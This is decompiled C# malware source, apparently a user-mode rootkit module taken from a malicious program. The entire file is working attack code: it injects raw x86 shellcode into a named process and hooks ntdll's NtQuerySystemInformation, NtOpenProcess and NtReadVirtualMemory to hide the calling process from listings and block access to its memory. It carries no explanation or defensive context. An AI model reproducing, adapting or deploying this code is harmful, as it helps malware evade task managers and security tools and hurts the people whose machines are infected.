using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace Complex.cvew;

[StandardModule]
internal sealed class ROOT1
{
	public struct MODULEENTRY32
	{
		public uint U32Size;

		public uint Th32ModuleId;

		public uint Th32ProcessId;

		public uint GlblcntUsage;

		public uint ProccntUsage;

		public IntPtr ModBaseAddr;

		public uint ModBaseSize;

		public IntPtr HModule;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string SzModule;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string SzeExePath;
	}

	private static byte[] NtReadVirtualMemory_AsmOpCode = new byte[240]
	{
		85, 139, 236, 131, 236, 20, 86, 199, 69, 248,
		1, 0, 0, 192, 232, 0, 0, 0, 0, 88,
		37, 0, 240, 255, 255, 137, 69, 252, 255, 117,
		24, 255, 117, 20, 255, 117, 16, 255, 117, 12,
		255, 117, 8, 139, 69, 252, 131, 192, 24, 255,
		208, 137, 69, 248, 131, 125, 248, 0, 15, 140,
		168, 0, 0, 0, 255, 117, 8, 139, 69, 252,
		255, 16, 139, 240, 139, 69, 252, 255, 80, 4,
		59, 240, 116, 10, 131, 125, 8, 255, 15, 133,
		138, 0, 0, 0, 131, 101, 244, 0, 235, 7,
		139, 69, 244, 64, 137, 69, 244, 131, 125, 244,
		3, 115, 119, 139, 69, 244, 139, 77, 252, 131,
		124, 129, 12, 0, 116, 101, 139, 69, 244, 139,
		77, 252, 139, 68, 129, 12, 59, 69, 12, 114,
		86, 139, 69, 12, 3, 69, 20, 139, 77, 244,
		139, 85, 252, 57, 68, 138, 12, 115, 68, 139,
		69, 244, 139, 77, 252, 139, 68, 129, 12, 43,
		69, 12, 137, 69, 240, 131, 101, 236, 0, 235,
		7, 139, 69, 236, 64, 137, 69, 236, 131, 125,
		236, 24, 115, 33, 139, 69, 244, 107, 192, 24,
		139, 77, 252, 141, 68, 1, 24, 139, 77, 236,
		3, 77, 240, 139, 85, 16, 139, 117, 236, 138,
		4, 48, 136, 4, 10, 235, 210, 233, 124, 255,
		255, 255, 139, 69, 248, 94, 201, 194, 20, 0
	};

	private static byte[] NtOpenProcess_AsmOpCode = new byte[84]
	{
		85, 139, 236, 81, 81, 199, 69, 248, 1, 0,
		0, 192, 232, 0, 0, 0, 0, 88, 37, 0,
		240, 255, 255, 137, 69, 252, 131, 125, 20, 0,
		116, 22, 139, 69, 20, 139, 77, 252, 139, 0,
		59, 65, 8, 117, 9, 199, 69, 248, 34, 0,
		0, 192, 235, 23, 255, 117, 20, 255, 117, 16,
		255, 117, 12, 255, 117, 8, 139, 69, 252, 131,
		192, 48, 255, 208, 137, 69, 248, 139, 69, 248,
		201, 194, 16, 0
	};

	private static byte[] NtQuerySystemInformation_AsmOpCode = new byte[405]
	{
		85, 139, 236, 131, 236, 28, 86, 87, 199, 69,
		236, 1, 0, 0, 192, 232, 0, 0, 0, 0,
		88, 37, 0, 240, 255, 255, 137, 69, 240, 255,
		117, 20, 255, 117, 16, 255, 117, 12, 255, 117,
		8, 139, 69, 240, 131, 192, 72, 255, 208, 137,
		69, 236, 131, 125, 236, 0, 15, 140, 78, 1,
		0, 0, 131, 125, 8, 5, 117, 93, 131, 101,
		248, 0, 139, 69, 12, 137, 69, 244, 139, 69,
		244, 131, 56, 0, 116, 70, 139, 69, 244, 137,
		69, 248, 139, 69, 248, 139, 77, 248, 3, 8,
		137, 77, 244, 139, 69, 244, 139, 77, 240, 139,
		64, 68, 59, 65, 8, 117, 37, 139, 69, 244,
		131, 56, 0, 117, 8, 139, 69, 248, 131, 32,
		0, 235, 15, 139, 69, 248, 139, 0, 139, 77,
		244, 3, 1, 139, 77, 248, 137, 1, 139, 69,
		248, 137, 69, 244, 235, 178, 233, 235, 0, 0,
		0, 131, 125, 8, 16, 15, 133, 225, 0, 0,
		0, 139, 69, 12, 137, 69, 252, 131, 101, 232,
		0, 235, 7, 139, 69, 232, 64, 137, 69, 232,
		139, 69, 252, 139, 77, 232, 59, 8, 15, 131,
		192, 0, 0, 0, 139, 69, 232, 193, 224, 4,
		139, 77, 252, 139, 85, 240, 139, 68, 1, 4,
		59, 66, 8, 15, 133, 162, 0, 0, 0, 139,
		69, 232, 193, 224, 4, 139, 77, 252, 198, 68,
		1, 9, 0, 139, 69, 232, 193, 224, 4, 139,
		77, 252, 131, 100, 1, 16, 0, 139, 69, 232,
		193, 224, 4, 51, 201, 139, 85, 252, 102, 137,
		76, 2, 10, 139, 69, 232, 193, 224, 4, 139,
		77, 252, 131, 100, 1, 12, 0, 139, 69, 232,
		193, 224, 4, 139, 77, 252, 198, 68, 1, 8,
		0, 139, 69, 232, 193, 224, 4, 139, 77, 252,
		131, 100, 1, 4, 0, 139, 69, 232, 137, 69,
		228, 235, 7, 139, 69, 228, 64, 137, 69, 228,
		139, 69, 252, 139, 77, 228, 59, 8, 115, 33,
		139, 69, 228, 64, 193, 224, 4, 139, 77, 252,
		141, 116, 1, 4, 139, 69, 228, 193, 224, 4,
		139, 77, 252, 141, 124, 1, 4, 165, 165, 165,
		165, 235, 206, 139, 69, 252, 139, 0, 72, 139,
		77, 252, 137, 1, 139, 69, 232, 72, 137, 69,
		232, 233, 43, 255, 255, 255, 139, 69, 236, 95,
		94, 201, 194, 16, 0
	};

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool CloseHandle(IntPtr pHandle);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesRead);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, ref uint lpflOldProtect);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint u32ProcessId);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	private static byte[] ReadMemoryByte(IntPtr hProcess, IntPtr lpBaseAddress, uint nSize)
	{
		checked
		{
			byte[] array = new byte[(int)(unchecked((ulong)nSize) - 1uL) + 1];
			byte[] lpBuffer = array;
			uint lpNumberOfBytesRead = 0u;
			ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesRead);
			return array;
		}
	}

	private static uint RemoteGetProcAddressManual(IntPtr hProcess, uint ModuleAddress, string Export)
	{
		checked
		{
			uint num = BitConverter.ToUInt32(ReadMemoryByte(hProcess, (IntPtr)(long)(unchecked((ulong)ModuleAddress) + 60uL), 4u), 0);
			uint num2 = BitConverter.ToUInt32(ReadMemoryByte(hProcess, (IntPtr)(long)(unchecked((ulong)checked(ModuleAddress + num)) + 120uL), 4u), 0);
			byte[] value = ReadMemoryByte(hProcess, (IntPtr)(ModuleAddress + num2), 40u);
			int num3 = BitConverter.ToInt32(value, 24);
			uint num4 = BitConverter.ToUInt32(value, 32) + ModuleAddress;
			uint num5 = BitConverter.ToUInt32(value, 28) + ModuleAddress;
			uint num6 = BitConverter.ToUInt32(value, 36) + ModuleAddress;
			IntPtr intPtr = Marshal.AllocHGlobal(64);
			int num7 = num3;
			int num8 = 1;
			uint result;
			while (true)
			{
				int num9 = num8;
				int num10 = num7;
				if (num9 <= num10)
				{
					uint num11 = BitConverter.ToUInt32(ReadMemoryByte(hProcess, (IntPtr)(long)(num4 + (ulong)((num8 - 1) * 4)), 4u), 0);
					Marshal.Copy(ReadMemoryByte(hProcess, (IntPtr)(ModuleAddress + num11), 64u), 0, intPtr, 64);
					string strA = Marshal.PtrToStringAnsi(intPtr);
					uint num12 = (uint)BitConverter.ToInt16(ReadMemoryByte(hProcess, (IntPtr)(long)(num6 + (ulong)((num8 - 1) * 2)), 2u), 0);
					result = BitConverter.ToUInt32(ReadMemoryByte(hProcess, (IntPtr)(long)(num5 + unchecked((ulong)num12) * 4uL), 4u), 0) + ModuleAddress;
					if (string.Compare(strA, Export, ignoreCase: true) == 0)
					{
						break;
					}
					num8++;
					continue;
				}
				Marshal.FreeHGlobal(intPtr);
				uint num13 = 0u;
				return 0u;
			}
			Marshal.FreeHGlobal(intPtr);
			return result;
		}
	}

	private static IntPtr GetModuleBaseAddress(string strProcess, string strModule)
	{
		checked
		{
			IntPtr intPtr = CreateToolhelp32Snapshot(24u, (uint)Process.GetProcessesByName(strProcess)[0].Id);
			IntPtr zero = IntPtr.Zero;
			IntPtr result;
			if (intPtr == zero)
			{
				result = zero;
			}
			else
			{
				MODULEENTRY32 lpme = default(MODULEENTRY32);
				lpme.U32Size = (uint)Marshal.SizeOf(lpme);
				if (Module32First(intPtr, ref lpme))
				{
					do
					{
						if (lpme.ModBaseAddr.ToInt64() <= 2147483647L && string.Compare(strModule, lpme.SzModule, ignoreCase: true) == 0)
						{
							return lpme.ModBaseAddr;
						}
					}
					while (Module32Next(intPtr, ref lpme));
				}
				result = zero;
			}
			return result;
		}
	}

	private static int CalculateOffset(int DesAddress, int SrcAddress)
	{
		return checked(DesAddress - SrcAddress - 5);
	}

	public static void HookApplication(string ProcessName)
	{
		byte[] array = new byte[97];
		uint[] array2 = new uint[4];
		byte[][] array3 = new byte[4][];
		uint lpflOldProtect = 0u;
		byte[] array4 = new byte[5] { 233, 0, 0, 0, 0 };
		byte[][] array5 = new byte[3][] { NtReadVirtualMemory_AsmOpCode, NtOpenProcess_AsmOpCode, NtQuerySystemInformation_AsmOpCode };
		checked
		{
			uint num = (uint)(array5[0].Length + array5[1].Length + array5[2].Length);
			IntPtr intPtr = OpenProcess(56, bInheritHandle: false, (uint)Process.GetProcessesByName(ProcessName)[0].Id);
			IntPtr zero = IntPtr.Zero;
			uint num2 = (uint)(int)VirtualAllocEx(intPtr, zero, (uint)(unchecked((ulong)num) + 96uL), 12288u, 64u);
			uint value = (uint)(int)RemoteGetProcAddressManual(intPtr, (uint)(int)GetModuleBaseAddress(ProcessName, "kernel32.dll"), "GetProcessId");
			uint value2 = (uint)(int)RemoteGetProcAddressManual(intPtr, (uint)(int)GetModuleBaseAddress(ProcessName, "kernel32.dll"), "GetCurrentProcessId");
			array2[0] = (uint)(int)RemoteGetProcAddressManual(intPtr, (uint)(int)GetModuleBaseAddress(ProcessName, "ntdll.dll"), "NtReadVirtualMemory");
			array2[1] = (uint)(int)RemoteGetProcAddressManual(intPtr, (uint)(int)GetModuleBaseAddress(ProcessName, "ntdll.dll"), "NtOpenProcess");
			array2[2] = (uint)(int)RemoteGetProcAddressManual(intPtr, (uint)(int)GetModuleBaseAddress(ProcessName, "ntdll.dll"), "NtQuerySystemInformation");
			array3[0] = ReadMemoryByte(intPtr, (IntPtr)array2[0], 24u);
			array3[1] = ReadMemoryByte(intPtr, (IntPtr)array2[1], 24u);
			array3[2] = ReadMemoryByte(intPtr, (IntPtr)array2[2], 24u);
			BitConverter.GetBytes(value).CopyTo(array, 0);
			BitConverter.GetBytes(value2).CopyTo(array, 4);
			BitConverter.GetBytes(Process.GetCurrentProcess().Id).CopyTo(array, 8);
			BitConverter.GetBytes(array2[0]).CopyTo(array, 12);
			BitConverter.GetBytes(array2[1]).CopyTo(array, 16);
			BitConverter.GetBytes(array2[2]).CopyTo(array, 20);
			array3[0].CopyTo(array, 24);
			array3[1].CopyTo(array, 48);
			array3[2].CopyTo(array, 72);
			uint num3 = num2;
			IntPtr hProcess = intPtr;
			IntPtr lpBaseAddress = (IntPtr)num3;
			byte[] lpBuffer = array;
			uint lpNumberOfBytesWritten = 0u;
			WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, 96u, ref lpNumberOfBytesWritten);
			num3 = (uint)(unchecked((ulong)num3) + 96uL);
			int num4 = array5.Length - 1;
			int num5 = 0;
			while (true)
			{
				int num6 = num5;
				int num7 = num4;
				if (num6 > num7)
				{
					break;
				}
				IntPtr hProcess2 = intPtr;
				IntPtr lpBaseAddress2 = (IntPtr)num3;
				byte[] lpBuffer2 = array5[num5];
				uint nSize = (uint)array5[num5].Length;
				lpNumberOfBytesWritten = 0u;
				WriteProcessMemory(hProcess2, lpBaseAddress2, lpBuffer2, nSize, ref lpNumberOfBytesWritten);
				num3 = (uint)(num3 + (ulong)array5[num5].Length);
				num5++;
			}
			IntPtr hProcess3 = intPtr;
			IntPtr lpAddress = (IntPtr)num2;
			uint dwSize = (uint)(unchecked((ulong)num) + 96uL);
			lpNumberOfBytesWritten = 0u;
			VirtualProtectEx(hProcess3, lpAddress, dwSize, 16u, ref lpNumberOfBytesWritten);
			num3 = (uint)(unchecked((ulong)num2) + 96uL);
			BitConverter.GetBytes(CalculateOffset((int)num3, (int)array2[0])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[0], (uint)array4.Length, 64u, ref lpflOldProtect);
			IntPtr hProcess4 = intPtr;
			IntPtr lpBaseAddress3 = (IntPtr)array2[0];
			byte[] lpBuffer3 = array4;
			uint nSize2 = (uint)array4.Length;
			lpNumberOfBytesWritten = 0u;
			WriteProcessMemory(hProcess4, lpBaseAddress3, lpBuffer3, nSize2, ref lpNumberOfBytesWritten);
			IntPtr hProcess5 = intPtr;
			IntPtr lpAddress2 = (IntPtr)array2[0];
			uint dwSize2 = (uint)array4.Length;
			uint flNewProtect = lpflOldProtect;
			lpNumberOfBytesWritten = 0u;
			VirtualProtectEx(hProcess5, lpAddress2, dwSize2, flNewProtect, ref lpNumberOfBytesWritten);
			num3 = (uint)(num3 + (ulong)array5[0].Length);
			BitConverter.GetBytes(CalculateOffset((int)num3, (int)array2[1])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[1], (uint)array4.Length, 64u, ref lpflOldProtect);
			IntPtr hProcess6 = intPtr;
			IntPtr lpBaseAddress4 = (IntPtr)array2[1];
			byte[] lpBuffer4 = array4;
			uint nSize3 = (uint)array4.Length;
			lpNumberOfBytesWritten = 0u;
			WriteProcessMemory(hProcess6, lpBaseAddress4, lpBuffer4, nSize3, ref lpNumberOfBytesWritten);
			IntPtr hProcess7 = intPtr;
			IntPtr lpAddress3 = (IntPtr)array2[1];
			uint dwSize3 = (uint)array4.Length;
			uint flNewProtect2 = lpflOldProtect;
			lpNumberOfBytesWritten = 0u;
			VirtualProtectEx(hProcess7, lpAddress3, dwSize3, flNewProtect2, ref lpNumberOfBytesWritten);
			num3 = (uint)(num3 + (ulong)array5[1].Length);
			BitConverter.GetBytes(CalculateOffset((int)num3, (int)array2[2])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[2], (uint)array4.Length, 64u, ref lpflOldProtect);
			IntPtr hProcess8 = intPtr;
			IntPtr lpBaseAddress5 = (IntPtr)array2[2];
			byte[] lpBuffer5 = array4;
			uint nSize4 = (uint)array4.Length;
			lpNumberOfBytesWritten = 0u;
			WriteProcessMemory(hProcess8, lpBaseAddress5, lpBuffer5, nSize4, ref lpNumberOfBytesWritten);
			IntPtr hProcess9 = intPtr;
			IntPtr lpAddress4 = (IntPtr)array2[2];
			uint dwSize4 = (uint)array4.Length;
			uint flNewProtect3 = lpflOldProtect;
			lpNumberOfBytesWritten = 0u;
			VirtualProtectEx(hProcess9, lpAddress4, dwSize4, flNewProtect3, ref lpNumberOfBytesWritten);
			CloseHandle(intPtr);
		}
	}
}
